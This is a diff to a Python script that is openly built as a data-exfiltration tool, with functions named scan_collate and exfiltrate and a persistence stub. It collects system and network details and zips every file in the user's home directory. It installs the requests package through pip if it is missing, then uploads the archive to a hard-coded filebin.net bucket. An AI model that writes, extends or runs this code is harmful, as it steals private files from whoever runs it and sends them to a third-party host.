@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 import os
+import sys
 import subprocess # running linux subproccess commands
-import csv # Storing data
 import zipfile # encrypting and storing
 import pathlib # following a directory path
-import re
+import re # used for regular expressions
 
 # BASH SCRIPT CHECKS PYTHON VERSION, GRABS THIS SCRIPT AND EXECUTES
 # SCAN & PROBE, GET KERNEL VERSION, RUNNING PROCCESSES, IP ADDR
@@ -24,6 +24,8 @@ def scan_collate():
     # IF CERTAIN PROCESS RUNNING, STOP OR CONTIUE
 
     internet_information = subprocess.check_output("ip -brief addr show", shell=True).decode("utf-8")
+
+    # CHECK IF PIP INSTALLED, THEN USE THIS LATER ON TO MAKE COPY IF INSTALLED, IF NOT SKIP.
 
     # FURTHER SCAN ON IP.
 
@@ -45,7 +47,7 @@ def exfiltrate():
 
     # Write structure of home directory to zip
     with zipfile.ZipFile("home.zip", mode="w") as archive:
-        archive.write("info.txt")
+        archive.write("info.txt") # sytem info txt file
         for file_path in home_directory.iterdir():
             archive.write(file_path, arcname=file_path.name)
 
@@ -53,7 +55,47 @@ def exfiltrate():
     with zipfile.ZipFile("home.zip", mode="r") as archive:
         archive.printdir()
 
-    # BE BETTER TO SIMPLY ZIP THE CSV FILE.
+    # try to upload to FileBin:
+    try:
+        import requests
+    except ImportError:
+        # requests import not found, try to install
+        install("requests")
+    else:
+        # otherwise use the requests library
+        upload()
+
+def install(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    except subprocess.CalledProcessError as e:
+        print("Pip not installed on system.")
+        pass
+    else:
+        global requests
+        requests = __import__("requests", globals(), locals()) # import requests at global level
+        upload()
+
+def upload(): 
+    # second storage (upload to drop off box - Filebin)
+    file_bin = "https://filebin.net/vqrrb6uwwjowcj5n" # URL to Filebin
+    file_bin_bucket = f"{file_bin}/bounty" # file name
+
+    file_data = {"file": open("home.zip", "rb")}
+
+    # Headers
+    headers = {
+        "accept": "application/json",
+        "Content-Type": "application/octet-stream",
+    }
+
+    response = requests.post(file_bin_bucket, headers=headers, data=file_data)
+
+    if response.status_code == 201:
+        print("File uploaded to FileBin.")
+    else:
+        print("File upload failed. Status code:", response.status_code)
+        print("Error message:", response.text)
 
 # func presistence()
 # Persistence
